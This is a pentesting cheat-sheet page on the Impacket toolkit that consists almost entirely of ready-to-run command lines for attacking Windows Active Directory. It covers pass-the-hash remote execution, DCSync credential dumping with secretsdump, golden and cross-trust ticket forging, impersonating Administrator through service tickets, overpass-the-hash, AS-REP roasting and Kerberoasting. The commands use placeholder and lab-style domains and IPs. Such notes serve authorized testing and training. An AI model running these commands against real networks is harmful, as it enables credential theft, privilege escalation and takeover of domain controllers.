---
title: Impacket
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/impacket
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

Impacket is a collection of Python classes for working with network protocols.

## Pass the hash

We can use impacket to pass a (NT:LM) hash to authenticate.

```bash
impacket-psexec -hashes :nt incendium@corp.local
```

```bash
impacket-atexec -hashes :nt incendium@corp.local whoami
```

```bash
impacket-smbexec -hashes :nt incendium@corp.local
```

```bash
impacket-wmiexec -hashes :nt incendium@corp.local
```

## Dcsync attack

If you have a password:

```bash
impacket-secretsdump corp.local/incendium:Password123@10.10.110.55
```

With a cached ticket:

```bash
impacket-secretsdump -k -no-pass incendium@zph-svrdc01.zsm.local -target-ip 192.168.210.10 -dc-ip 192.168.210.10
```

## Generate tickets

To generate the TGS with NTLM

```bash
impacket-ticketer -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
```

### Golden trust cross ticket (child-parent domains in forest)

```bash
└─$ impacket-ticketer -nthash <krbtgt-hash> -domain-sid S-1-5-21-3056178012-3972705859-382195122 -domain internal.zsm.local -extra-sid S-1-5-21-2734290894-461713716-382195122-519 -spn krbtgt/parent.local incendium
```

### Service ticket

Impacket’s getST.py will request a Service Ticket and save it as ccache.

With credentials:

```
impacket-getST -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123
```

With cached ticket:

```
impacket-getST -k -no-pass -spn cifs/DC-01.parent.local parent.local/incendium@parent.local -dc-ip 192.168.210.10
```

### Overpass The Hash/Pass The Key (PTK)

```bash
// With NT hash
impacket-getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
// With credentials
impacket-getTGT.py <domain_name>/<user_name>:[password]
```

## AS-REP roasting&#x20;

```
impacket-GetNPUsers <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

## Kerberoasting

```
impacket-GetUserSPNs -target-domain domain.local -usersfile users.txt -dc-ip dc01.domain.local domain.local/guest -
no-pass
```
